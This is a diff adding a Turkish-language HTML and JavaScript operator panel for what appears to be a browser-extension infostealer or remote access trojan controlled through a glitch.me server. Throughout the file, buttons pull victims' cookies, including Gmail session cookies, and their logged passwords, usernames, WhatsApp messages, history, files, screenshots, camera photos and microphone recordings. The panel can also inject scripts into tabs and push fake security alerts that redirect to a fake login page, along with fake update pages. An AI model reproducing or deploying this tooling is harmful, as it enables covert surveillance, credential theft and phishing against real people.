@@ -1,1 +1,804 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kontrol Paneli</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        .client { padding: 10px; border: 1px solid #ccc; margin-bottom: 10px; }
+        .client-header { display: flex; align-items: center; cursor: pointer; }
+        .client-content { margin-top: 10px; }
+        .client.collapsed .client-content { display: none; }
+        .client.collapsed .toggle-btn::before { content: '▶ '; }
+        .toggle-btn::before { content: '▼ '; }
+        button { margin-right: 5px; padding: 5px 10px; cursor: pointer; }
+        pre { background: #f5f5f5; padding: 10px; max-height: 300px; overflow-y: auto; display: none; }
+        .active { color: green; }
+        .inactive { color: red; }
+        input[type="text"], textarea { margin-right: 5px; padding: 3px; width: 100%; box-sizing: border-box; }
+        .delete-btn { background-color: #e81a1a; color: white; }
+        .delete-btn:hover { background-color: #cc1616; }
+        .screenshot-img { max-width: 100%; max-height: 400px; display: none; margin-top: 10px; }
+        .tabs-list { margin-top: 10px; }
+        .active-tab { font-weight: bold; color: blue; }
+        .error-msg { color: red; display: none; margin-top: 10px; }
+        select { margin-right: 5px; padding: 3px; }
+        .close-tab-btn { background-color: #ff5555; color: white; }
+        .close-tab-btn:hover { background-color: #cc4444; }
+        .html-input { height: 100px; margin-bottom: 10px; }
+    </style>
+</head>
+<body>
+    <h1>Kontrol Paneli</h1>
+    <div id="clients"></div>
 
+    <script>
+        const serverUrl = 'https://summer-ludicrous-wolf.glitch.me';
+        const wsUrl = 'wss://summer-ludicrous-wolf.glitch.me';
+        let displayNames = JSON.parse(localStorage.getItem('displayNames')) || {};
+        let screenshotStates = {};
+        let clientElements = {};
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const token = urlParams.get('token');
+
+        startApp();
+
+        function startApp() {
+            const ws = new WebSocket(wsUrl);
+            ws.onopen = () => updateClients();
+            ws.onmessage = () => updateClients();
+
+            updateClients();
+            setInterval(updateClients, 30000);
+        }
+
+        function updateClients() {
+            fetch(`${serverUrl}/clients?token=${encodeURIComponent(token)}`)
+                .then(res => {
+                    if (!res.ok) throw new Error('Token geçersiz');
+                    return res.json();
+                })
+                .then(clients => {
+                    const clientDiv = document.getElementById('clients');
+
+                    clients.forEach(({ clientId, isActive }) => {
+                        if (!clientElements[clientId]) {
+                            const displayName = displayNames[clientId] || clientId;
+                            const div = document.createElement('div');
+                            div.className = 'client collapsed';
+                            div.id = `client_${clientId}`;
+                            div.innerHTML = `
+                                <div class="client-header" onclick="toggleClient('${clientId}')">
+                                    <span class="toggle-btn"></span>
+                                    <input type="text" value="${displayName}" id="name_${clientId}" onblur="updateDisplayName('${clientId}', this.value)">
+                                    <span id="status_${clientId}" class="${isActive ? 'active' : 'inactive'}">[${isActive ? 'Aktif' : 'Pasif'}]</span>
+                                </div>
+                                <div class="client-content">
+                                    <button onclick="sendCommand('${clientId}', 'getCookies')">Çerezleri Çek</button>
+                                    <button onclick="sendCommand('${clientId}', 'getScreenshot')">Aktif Sekme SS</button>
+                                    <select id="tab_select_${clientId}"></select>
+                                    <button onclick="captureTabScreenshot('${clientId}')">Seçili Sekme SS</button>
+                                    <button onclick="getLog('${clientId}', 'username')">Username Logları</button>
+                                    <button onclick="getLog('${clientId}', 'password')">Password Logları</button>
+                                    <button onclick="getLog('${clientId}', 'whatsapp')">WhatsApp Mesajları</button>
+                                    <button onclick="downloadUsernameLogs('${clientId}')">Username Loglarını İndir</button>
+                                    <button onclick="downloadPasswordLogs('${clientId}')">Password Loglarını İndir</button>
+                                    <button onclick="downloadWhatsAppLogs('${clientId}')">WhatsApp Loglarını İndir</button>
+                                    <button onclick="showCookies('${clientId}')">Çerezleri Gör</button>
+                                    <button onclick="downloadCookies('${clientId}')">Çerezleri İndir</button>
+                                    <button onclick="downloadGmailCookies('${clientId}')">Gmail Çerezlerini İndir</button>
+                                    <button onclick="sendCommand('${clientId}', 'getFiles')">Dosya Çek</button>
+                                    <button class="delete-btn" onclick="deleteClient('${clientId}')">Sil</button>
+                                    <button onclick="showLatestScreenshot('${clientId}')">Son Ekran Görüntüsü</button>
+                                    <button onclick="sendCommand('${clientId}', 'getHistory')">Geçmişi Çek</button>
+                                    <button onclick="downloadHistory('${clientId}')">Geçmişi İndir</button>
+                                    <button onclick="sendCommand('${clientId}', 'captureCamera')">Kamera Çek</button>
+                                    <button onclick="downloadCamera('${clientId}')">Kamera Fotoğrafını İndir</button>
+                                    <button onclick="sendCommand('${clientId}', 'recordMic')">Mikrofon Kaydet</button>
+                                    <button onclick="downloadMic('${clientId}')">Mikrofon Kaydını İndir</button>
+                                    <input type="text" id="url_${clientId}" placeholder="Açılacak URL (örn: https://example.com)">
+                                    <button onclick="openUrl('${clientId}')">Sekme Aç</button>
+                                    <textarea id="script_${clientId}" placeholder='Script için: {"type": "dom", "action": "addNotification", "value": "Hesabınız tehlikede!", "redirectUrl": "http://fake-login.com"}'></textarea>
+                                    <button onclick="sendScript('${clientId}')">Script Gönder</button>
+                                    <button onclick="sendActiveTabScript('${clientId}')">Aktif Sekmeye Script Gönder</button>
+                                    <button onclick="sendFakeNotification('${clientId}')">Sahte Bildirim Gönder</button>
+                                    <textarea id="fake_update_${clientId}" class="html-input" placeholder="Sahte güncelleme sayfası için HTML kodu girin"></textarea>
+                                    <button onclick="sendFakeUpdate('${clientId}')">Sahte Güncelleme Göster</button>
+                                    <button onclick="parseCookies('${clientId}')">Cookie Ayrıştır</button>
+                                    <img id="screenshot_${clientId}" class="screenshot-img" alt="En son ekran görüntüsü">
+                                    <div id="screenshot_error_${clientId}" class="error-msg"></div>
+                                    <div id="tabs_${clientId}" class="tabs-list"></div>
+                                </div>
+                            `;
+                            clientDiv.appendChild(div);
+                            clientElements[clientId] = div;
+                            updateTabs(clientId);
+                            if (screenshotStates[clientId]) showLatestScreenshot(clientId, true);
+                        } else {
+                            const statusSpan = document.getElementById(`status_${clientId}`);
+                            statusSpan.textContent = `[${isActive ? 'Aktif' : 'Pasif'}]`;
+                            statusSpan.className = isActive ? 'active' : 'inactive';
+                            updateTabs(clientId);
+                        }
+                    });
+
+                    Object.keys(clientElements).forEach(clientId => {
+                        if (!clients.some(c => c.clientId === clientId)) {
+                            clientElements[clientId].remove();
+                            delete clientElements[clientId];
+                            delete screenshotStates[clientId];
+                        }
+                    });
+                })
+                .catch(err => {
+                    console.error('Hata:', err);
+                    alert('Erişim hatası: Token geçersiz veya sunucu yanıt vermiyor');
+                });
+        }
+
+        function toggleClient(clientId) {
+            const clientDiv = document.getElementById(`client_${clientId}`);
+            clientDiv.classList.toggle('collapsed');
+        }
+
+        function updateTabs(clientId) {
+            fetch(`${serverUrl}/getlog?clientId=${clientId}&type=tabs&token=${encodeURIComponent(token)}`)
+                .then(res => res.json())
+                .then(tabs => {
+                    const tabsDiv = document.getElementById(`tabs_${clientId}`);
+                    const tabSelect = document.getElementById(`tab_select_${clientId}`);
+                    if (!tabsDiv || !tabSelect) return;
+                    if (tabs.length === 0) {
+                        tabsDiv.innerHTML = 'Sekme bilgisi yok.';
+                        tabSelect.innerHTML = '<option value="">Sekme yok</option>';
+                        return;
+                    }
+                    tabsDiv.innerHTML = '<h4>Sekmeler:</h4>';
+                    const ul = document.createElement('ul');
+                    tabSelect.innerHTML = '';
+                    tabs[0].data.forEach(tab => {
+                        const li = document.createElement('li');
+                        li.innerHTML = `${tab.title} (${tab.url}) <button class="close-tab-btn" onclick="closeTab('${clientId}', ${tab.id})">Kapat</button>`;
+                        if (tab.active) li.className = 'active-tab';
+                        ul.appendChild(li);
+
+                        const option = document.createElement('option');
+                        option.value = tab.id;
+                        option.textContent = `${tab.title} (${tab.url})`;
+                        if (tab.active) option.selected = true;
+                        tabSelect.appendChild(option);
+                    });
+                    tabsDiv.appendChild(ul);
+                });
+        }
+
+        function closeTab(clientId, tabId) {
+            console.log(`Sekme kapatılıyor: ${tabId} -> ${clientId}`);
+            fetch(`${serverUrl}/sendCommand`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ clientId, command: 'closeTab', payload: JSON.stringify({ tabId }), token })
+            })
+                .then(res => {
+                    if (!res.ok) {
+                        return res.text().then(text => {
+                            throw new Error(`Sunucu hatası: ${res.status} - ${text}`);
+                        });
+                    }
+                    return res.json();
+                })
+                .then(result => {
+                    console.log('Sunucu yanıtı:', result);
+                    alert(result.message);
+                    updateTabs(clientId);
+                })
+                .catch(err => {
+                    console.error('Hata:', err);
+                    alert('Hata: ' + err.message);
+                });
+        }
+
+        function sendFakeUpdate(clientId) {
+            const htmlInput = document.getElementById(`fake_update_${clientId}`).value;
+            if (!htmlInput.trim()) return alert('Lütfen sahte güncelleme için HTML kodu girin!');
+            console.log(`Sahte güncelleme gönderiliyor: ${clientId}, HTML uzunluğu: ${htmlInput.length}`);
+            fetch(`${serverUrl}/sendCommand`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    clientId,
+                    command: 'fakeUpdate',
+                    payload: JSON.stringify({ html: htmlInput }),
+                    token
+                })
+            })
+                .then(res => {
+                    console.log(`Sunucu yanıtı, durum: ${res.status}`, res);
+                    if (!res.ok) {
+                        return res.text().then(text => {
+                            throw new Error(`Sunucu hatası: ${res.status} - ${text}`);
+                        });
+                    }
+                    return res.json();
+                })
+                .then(result => {
+                    console.log('Sunucu yanıtı:', result);
+                    alert(result.message);
+                })
+                .catch(err => {
+                    console.error('Hata:', err);
+                    alert(`Hata: ${err.message}`);
+                });
+        }
+
+        function sendCommand(clientId, command) {
+            console.log(`Komut gönderiliyor: ${command} -> ${clientId}`);
+            fetch(`${serverUrl}/sendCommand`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ clientId, command, payload: '', token })
+            })
+                .then(res => {
+                    if (!res.ok) {
+                        return res.text().then(text => {
+                            throw new Error(`Sunucu hatası: ${res.status} - ${text}`);
+                        });
+                    }
+                    return res.json();
+                })
+                .then(result => alert(result.message))
+                .catch(err => console.error('Hata:', err));
+        }
+
+        function captureTabScreenshot(clientId) {
+            const tabSelect = document.getElementById(`tab_select_${clientId}`);
+            const tabId = tabSelect.value;
+            if (!tabId) return alert('Lütfen bir sekme seçin!');
+            console.log(`Sekme SS isteniyor, Client: ${clientId}, Tab: ${tabId}`);
+            fetch(`${serverUrl}/sendCommand`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ clientId, command: 'getScreenshot', payload: JSON.stringify({ tabId }), token })
+            })
+                .then(res => {
+                    if (!res.ok) {
+                        return res.text().then(text => {
+                            throw new Error(`Sunucu hatası: ${res.status} - ${text}`);
+                        });
+                    }
+                    return res.json();
+                })
+                .then(result => {
+                    console.log('Sunucu yanıtı:', result);
+                    alert(result.message);
+                })
+                .catch(err => console.error('Hata:', err));
+        }
+
+        function openUrl(clientId) {
+            const urlInput = document.getElementById(`url_${clientId}`).value;
+            if (!urlInput) return alert('Lütfen bir URL girin!');
+            if (!urlInput.match(/^https?:\/\//)) return alert('Geçerli bir URL girin (http:// veya https:// ile başlamalı)!');
+            console.log(`URL açılıyor: ${urlInput} -> ${clientId}`);
+            fetch(`${serverUrl}/sendCommand`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ clientId, command: 'openUrl', payload: JSON.stringify({ url: urlInput }), token })
+            })
+                .then(res => {
+                    if (!res.ok) {
+                        return res.text().then(text => {
+                            throw new Error(`Sunucu hatası: ${res.status} - ${text}`);
+                        });
+                    }
+                    return res.json();
+                })
+                .then(result => {
+                    console.log('Sunucu yanıtı:', result);
+                    alert(result.message);
+                })
+                .catch(err => {
+                    console.error('Hata:', err);
+                    alert('Hata: ' + err.message);
+                });
+        }
+
+        function sendScript(clientId) {
+            const scriptInput = document.getElementById(`script_${clientId}`).value;
+            if (!scriptInput) return alert('Script veya cookie paketi girin!');
+            let payload;
+            try {
+                payload = JSON.parse(scriptInput);
+                if (!payload.type) throw new Error('type eksik');
+            } catch (e) {
+                payload = { type: 'dom', action: null, selector: null, value: scriptInput };
+                console.log('Düz metin algılandı, varsayılan DOM payload’u oluşturuldu:', payload);
+            }
+            console.log(`Script gönderiliyor: ${JSON.stringify(payload)} -> ${clientId}`);
+            fetch(`${serverUrl}/sendCommand`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ clientId, command: 'executeScript', payload: JSON.stringify(payload), token })
+            })
+                .then(res => {
+                    if (!res.ok) {
+                        return res.text().then(text => {
+                            throw new Error(`Sunucu hatası: ${res.status} - ${text}`);
+                        });
+                    }
+                    return res.json();
+                })
+                .then(result => {
+                    console.log('Sunucu yanıtı:', result);
+                    alert(result.message);
+                })
+                .catch(err => {
+                    console.error('Hata:', err);
+                    alert('Hata: ' + err.message);
+                });
+        }
+
+        function sendActiveTabScript(clientId) {
+            const scriptInput = document.getElementById(`script_${clientId}`).value;
+            if (!scriptInput) return alert('Aktif sekme için script girin!');
+            let payload;
+            try {
+                payload = JSON.parse(scriptInput);
+                if (!payload.type || !payload.action) throw new Error('type veya action eksik');
+            } catch (e) {
+                return alert('Geçersiz JSON formatı: ' + e.message);
+            }
+            console.log(`Aktif sekme scripti gönderiliyor: ${JSON.stringify(payload)} -> ${clientId}`);
+            fetch(`${serverUrl}/sendCommand`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ clientId, command: 'executeActiveTabScript', payload: JSON.stringify(payload), token })
+            })
+                .then(res => {
+                    if (!res.ok) {
+                        return res.text().then(text => {
+                            throw new Error(`Sunucu hatası: ${res.status} - ${text}`);
+                        });
+                    }
+                    return res.json();
+                })
+                .then(result => {
+                    console.log('Sunucu yanıtı:', result);
+                    alert(result.message);
+                })
+                .catch(err => {
+                    console.error('Hata:', err);
+                    alert('Hata: ' + err.message);
+                });
+        }
+
+        function sendFakeNotification(clientId) {
+            const scriptInput = document.getElementById(`script_${clientId}`).value;
+            let payload;
+            if (!scriptInput) {
+                payload = {
+                    type: "dom",
+                    action: "addNotification",
+                    value: "Hesabınız tehlikede! Doğrulamak için tıklayın.",
+                    redirectUrl: "http://fake-login.com"
+                };
+            } else {
+                try {
+                    payload = JSON.parse(scriptInput);
+                    if (!payload.type || !payload.action) {
+                        alert('Payload’da type ve action zorunlu!');
+                        return;
+                    }
+                    if (!payload.redirectUrl) {
+                        payload.redirectUrl = "http://fake-login.com";
+                    }
+                } catch (e) {
+                    alert('Geçersiz JSON formatı: ' + e.message);
+                    return;
+                }
+            }
+            console.log(`Sahte bildirim gönderiliyor: ${JSON.stringify(payload)} -> ${clientId}`);
+            fetch(`${serverUrl}/sendCommand`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ clientId, command: 'executeActiveTabScript', payload: JSON.stringify(payload), token })
+            })
+                .then(res => {
+                    if (!res.ok) {
+                        return res.text().then(text => {
+                            throw new Error(`Sunucu hatası: ${res.status} - ${text}`);
+                        });
+                    }
+                    return res.json();
+                })
+                .then(result => {
+                    console.log('Sunucu yanıtı:', result);
+                    alert(result.message);
+                })
+                .catch(err => {
+                    console.error('Hata:', err);
+                    alert('Hata: ' + err.message);
+                });
+        }
+
+        function getLog(clientId, type) {
+            fetch(`${serverUrl}/getlog?clientId=${clientId}&type=${type}&token=${encodeURIComponent(token)}`)
+                .then(res => {
+                    if (!res.ok) {
+                        return res.text().then(text => {
+                            throw new Error(`Sunucu hatası: ${res.status} - ${text}`);
+                        });
+                    }
+                    return res.json();
+                })
+                .then(logs => alert(JSON.stringify(logs, null, 2)))
+                .catch(err => console.error('Hata:', err));
+        }
+
+        function showCookies(clientId) {
+            fetch(`${serverUrl}/getlog?clientId=${clientId}&type=cookies&token=${encodeURIComponent(token)}`)
+                .then(res => {
+                    if (!res.ok) {
+                        return res.text().then(text => {
+                            throw new Error(`Sunucu hatası: ${res.status} - ${text}`);
+                        });
+                    }
+                    return res.json();
+                })
+                .then(logs => alert(JSON.stringify(logs, null, 2)))
+                .catch(err => console.error('Hata:', err));
+        }
+
+        function downloadCookies(clientId) {
+            fetch(`${serverUrl}/getlog?clientId=${clientId}&type=cookies&token=${encodeURIComponent(token)}`)
+                .then(res => {
+                    if (!res.ok) {
+                        return res.text().then(text => {
+                            throw new Error(`Sunucu hatası: ${res.status} - ${text}`);
+                        });
+                    }
+                    return res.json();
+                })
+                .then(logs => {
+                    if (logs.length === 0) return alert('Çerez yok.');
+                    const blob = new Blob([JSON.stringify(logs, null, 2)], { type: 'application/json' });
+                    const url = window.URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = `${clientId}_cookies.json`;
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    window.URL.revokeObjectURL(url);
+                })
+                .catch(err => console.error('Hata:', err));
+        }
+
+        function downloadGmailCookies(clientId) {
+            fetch(`${serverUrl}/getlog?clientId=${clientId}&type=cookies&token=${encodeURIComponent(token)}`)
+                .then(res => {
+                    if (!res.ok) {
+                        return res.text().then(text => {
+                            throw new Error(`Sunucu hatası: ${res.status} - ${text}`);
+                        });
+                    }
+                    return res.json();
+                })
+                .then(logs => {
+                    if (logs.length === 0) return alert('Çerez yok.');
+                    const gmailCookies = logs[0].data.filter(cookie => 
+                        cookie.domain === '.google.com' || cookie.domain === 'mail.google.com'
+                    );
+                    if (gmailCookies.length === 0) return alert('Gmail çerezi bulunamadı.');
+                    const blob = new Blob([JSON.stringify(gmailCookies, null, 2)], { type: 'application/json' });
+                    const url = window.URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = `${clientId}_gmail_cookies.json`;
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    window.URL.revokeObjectURL(url);
+                })
+                .catch(err => {
+                    console.error('Hata:', err);
+                    alert('Gmail çerezlerini indirme hatası: ' + err.message);
+                });
+        }
+
+        function downloadUsernameLogs(clientId) {
+            fetch(`${serverUrl}/getlog?clientId=${clientId}&type=username&token=${encodeURIComponent(token)}`)
+                .then(res => {
+                    if (!res.ok) {
+                        return res.text().then(text => {
+                            throw new Error(`Sunucu hatası: ${res.status} - ${text}`);
+                        });
+                    }
+                    return res.json();
+                })
+                .then(logs => {
+                    if (logs.length === 0) return alert('Username logu yok.');
+                    const blob = new Blob([JSON.stringify(logs, null, 2)], { type: 'application/json' });
+                    const url = window.URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = `${clientId}_username_logs.json`;
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    window.URL.revokeObjectURL(url);
+                })
+                .catch(err => {
+                    console.error('Hata:', err);
+                    alert('Username loglarını indirme hatası: ' + err.message);
+                });
+        }
+
+        function downloadPasswordLogs(clientId) {
+            fetch(`${serverUrl}/getlog?clientId=${clientId}&type=password&token=${encodeURIComponent(token)}`)
+                .then(res => {
+                    if (!res.ok) {
+                        return res.text().then(text => {
+                            throw new Error(`Sunucu hatası: ${res.status} - ${text}`);
+                        });
+                    }
+                    return res.json();
+                })
+                .then(logs => {
+                    if (logs.length === 0) return alert('Password logu yok.');
+                    const blob = new Blob([JSON.stringify(logs, null, 2)], { type: 'application/json' });
+                    const url = window.URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = `${clientId}_password_logs.json`;
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    window.URL.revokeObjectURL(url);
+                })
+                .catch(err => {
+                    console.error('Hata:', err);
+                    alert('Password loglarını indirme hatası: ' + err.message);
+                });
+        }
+
+        function downloadWhatsAppLogs(clientId) {
+            fetch(`${serverUrl}/getlog?clientId=${clientId}&type=whatsapp&token=${encodeURIComponent(token)}`)
+                .then(res => {
+                    if (!res.ok) {
+                        return res.text().then(text => {
+                            throw new Error(`Sunucu hatası: ${res.status} - ${text}`);
+                        });
+                    }
+                    return res.json();
+                })
+                .then(logs => {
+                    if (logs.length === 0) return alert('WhatsApp logu yok.');
+                    const blob = new Blob([JSON.stringify(logs, null, 2)], { type: 'application/json' });
+                    const url = window.URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = `${clientId}_whatsapp_logs.json`;
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    window.URL.revokeObjectURL(url);
+                })
+                .catch(err => {
+                    console.error('Hata:', err);
+                    alert('WhatsApp loglarını indirme hatası: ' + err.message);
+                });
+        }
+
+        function downloadHistory(clientId) {
+            fetch(`${serverUrl}/getlog?clientId=${clientId}&type=history&token=${encodeURIComponent(token)}`)
+                .then(res => {
+                    if (!res.ok) {
+                        return res.text().then(text => {
+                            throw new Error(`Sunucu hatası: ${res.status} - ${text}`);
+                        });
+                    }
+                    return res.json();
+                })
+                .then(logs => {
+                    if (!logs || logs.length === 0 || logs.error) return alert('Geçmiş yok veya hata: ' + (logs.error || 'Veri bulunamadı'));
+                    const blob = new Blob([JSON.stringify(logs, null, 2)], { type: 'application/json' });
+                    const url = window.URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = `${clientId}_history.json`;
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    window.URL.revokeObjectURL(url);
+                })
+                .catch(err => {
+                    console.error('Hata:', err);
+                    alert('Geçmiş indirme hatası: ' + err.message);
+                });
+        }
+
+        function downloadCamera(clientId) {
+            fetch(`${serverUrl}/getlog?clientId=${clientId}&type=camera&token=${encodeURIComponent(token)}`)
+                .then(res => {
+                    if (!res.ok) {
+                        return res.text().then(text => {
+                            throw new Error(`Sunucu hatası: ${res.status} - ${text}`);
+                        });
+                    }
+                    return res.json();
+                })
+                .then(logs => {
+                    if (!logs || logs.length === 0 || logs.error) return alert('Kamera fotoğrafı yok veya hata: ' + (logs.error || 'Veri bulunamadı'));
+                    const latestLog = logs[logs.length - 1];
+                    if (!latestLog.data) return alert('Kamera verisi geçersiz.');
+                    if (latestLog.data.startsWith('/files/')) {
+                        const url = `${serverUrl}${latestLog.data}?token=${encodeURIComponent(token)}`;
+                        const a = document.createElement('a');
+                        a.href = url;
+                        a.download = `${clientId}_camera.png`;
+                        document.body.appendChild(a);
+                        a.click();
+                        document.body.removeChild(a);
+                    } else {
+                        alert('Kamera fotoğrafı bir hata içeriyor: ' + latestLog.data);
+                    }
+                })
+                .catch(err => {
+                    console.error('Hata:', err);
+                    alert('Kamera fotoğrafı indirme hatası: ' + err.message);
+                });
+        }
+
+        function downloadMic(clientId) {
+            fetch(`${serverUrl}/getlog?clientId=${clientId}&type=mic&token=${encodeURIComponent(token)}`)
+                .then(res => {
+                    if (!res.ok) {
+                        return res.text().then(text => {
+                            throw new Error(`Sunucu hatası: ${res.status} - ${text}`);
+                        });
+                    }
+                    return res.json();
+                })
+                .then(logs => {
+                    if (!logs || logs.length === 0 || logs.error) return alert('Mikrofon kaydı yok veya hata: ' + (logs.error || 'Veri bulunamadı'));
+                    const latestLog = logs[logs.length - 1];
+                    if (!latestLog.data) return alert('Mikrofon verisi geçersiz.');
+                    if (latestLog.data.startsWith('/files/')) {
+                        const url = `${serverUrl}${latestLog.data}?token=${encodeURIComponent(token)}`;
+                        const a = document.createElement('a');
+                        a.href = url;
+                        a.download = `${clientId}_mic.wav`;
+                        document.body.appendChild(a);
+                        a.click();
+                        document.body.removeChild(a);
+                    } else {
+                        alert('Mikrofon kaydı bir hata içeriyor: ' + latestLog.data);
+                    }
+                })
+                .catch(err => {
+                    console.error('Hata:', err);
+                    alert('Mikrofon kaydı indirme hatası: ' + err.message);
+                });
+        }
+
+        function parseCookies(clientId) {
+            const scriptInput = document.getElementById(`script_${clientId}`).value;
+            if (!scriptInput) return alert('Lütfen ayrıştırmak istediğiniz cookie paketini girin!');
+            let targetCookies;
+            try {
+                targetCookies = JSON.parse(scriptInput);
+                if (!Array.isArray(targetCookies)) throw new Error('Cookie paketi bir dizi olmalı');
+            } catch (e) {
+                console.error('Cookie paketi parse hatası:', e);
+                return alert('Geçersiz cookie paketi formatı: JSON dizisi bekleniyor');
+            }
+
+            fetch(`${serverUrl}/getlog?clientId=${clientId}&type=cookies&token=${encodeURIComponent(token)}`)
+                .then(res => {
+                    if (!res.ok) {
+                        return res.text().then(text => {
+                            throw new Error(`Sunucu hatası: ${res.status} - ${text}`);
+                        });
+                    }
+                    return res.json();
+                })
+                .then(logs => {
+                    if (!logs || logs.length === 0) return alert('Client’a ait çerez yok.');
+                    const clientCookies = logs[0].data;
+
+                    const matchedCookies = clientCookies.filter(clientCookie => 
+                        targetCookies.some(targetCookie => 
+                            (targetCookie.name && clientCookie.name === targetCookie.name) &&
+                            (!targetCookie.domain || clientCookie.domain === targetCookie.domain)
+                        )
+                    );
+
+                    if (matchedCookies.length === 0) return alert('Eşleşen çerez bulunamadı.');
+                    
+                    const blob = new Blob([JSON.stringify(matchedCookies, null, 2)], { type: 'application/json' });
+                    const url = window.URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = `${clientId}_parsed_cookies.json`;
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    window.URL.revokeObjectURL(url);
+                })
+                .catch(err => {
+                    console.error('Hata:', err);
+                    alert('Cookie ayrıştırma hatası: ' + err.message);
+                });
+        }
+
+        function deleteClient(clientId) {
+            const displayName = displayNames[clientId] || clientId;
+            const confirmation = prompt(`"${displayName}" client’ını silmek için lütfen client ID’sini girin:`, '');
+            if (confirmation === clientId) {
+                fetch(`${serverUrl}/deleteClient?clientId=${clientId}&token=${encodeURIComponent(token)}`)
+                    .then(res => {
+                        if (!res.ok) {
+                            return res.text().then(text => {
+                                throw new Error(`Sunucu hatası: ${res.status} - ${text}`);
+                            });
+                        }
+                        return res.json();
+                    })
+                    .then(result => {
+                        alert(result.message);
+                        updateClients();
+                    })
+                    .catch(err => alert('Silme hatası: ' + err.message));
+            } else {
+                alert('Client ID eşleşmedi, silme iptal edildi.');
+            }
+        }
+
+        function updateDisplayName(clientId, newName) {
+            if (newName.trim() && newName !== displayNames[clientId]) {
+                displayNames[clientId] = newName;
+                localStorage.setItem('displayNames', JSON.stringify(displayNames));
+                document.getElementById(`name_${clientId}`).value = newName;
+            }
+        }
+
+        function showLatestScreenshot(clientId, preserveState = false) {
+            fetch(`${serverUrl}/getlog?clientId=${clientId}&type=screenshot&token=${encodeURIComponent(token)}`)
+                .then(res => {
+                    if (!res.ok) {
+                        return res.text().then(text => {
+                            throw new Error(`Sunucu hatası: ${res.status} - ${text}`);
+                        });
+                    }
+                    return res.json();
+                })
+                .then(logs => {
+                    if (logs.length === 0) return alert('Ekran görüntüsü yok.');
+                    const latestScreenshot = logs[logs.length - 1];
+                    const img = document.getElementById(`screenshot_${clientId}`);
+                    const errorDiv = document.getElementById(`screenshot_error_${clientId}`);
+
+                    if (latestScreenshot.data.startsWith('/files/')) {
+                        img.src = `${serverUrl}${latestScreenshot.data}?token=${encodeURIComponent(token)}`;
+                        errorDiv.style.display = 'none';
+                        if (!preserveState) {
+                            const shouldShow = img.style.display === 'none' || !screenshotStates[clientId];
+                            img.style.display = shouldShow ? 'block' : 'none';
+                            screenshotStates[clientId] = shouldShow;
+                        } else {
+                            img.style.display = screenshotStates[clientId] ? 'block' : 'none';
+                        }
+                    } else {
+                        img.style.display = 'none';
+                        errorDiv.textContent = latestScreenshot.data;
+                        errorDiv.style.display = 'block';
+                    }
+                })
+                .catch(err => alert('Ekran görüntüsü yükleme hatası: ' + err.message));
+        }
+    </script>
+</body>
+</html>
